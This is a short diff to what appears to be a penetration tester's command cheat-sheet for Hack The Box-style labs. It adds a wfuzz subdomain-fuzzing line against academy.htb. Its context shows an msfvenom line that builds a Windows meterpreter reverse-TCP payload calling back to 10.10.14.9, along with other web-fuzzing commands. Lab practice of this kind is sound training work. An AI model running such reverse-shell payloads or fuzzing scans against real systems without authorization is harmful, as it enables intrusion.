@@ -24,6 +24,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe >
 ##FUZZ##
 wfuzz -c -w ../../../tools/SecLists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://xx.xx.xx.xx:xxx/FUZZ.FUZ2Z --hc 404,403 -t 100
 wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: FUZZ.host.com" --hc 200 --hw 356 -t xx.xx.xx.xx
+wfuzz -c -w /home/kali/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403,301 -H "Host: FUZZ.academy.htb" -u http://academy.com -t 100
 nikto
 dirsearch
 ffuf
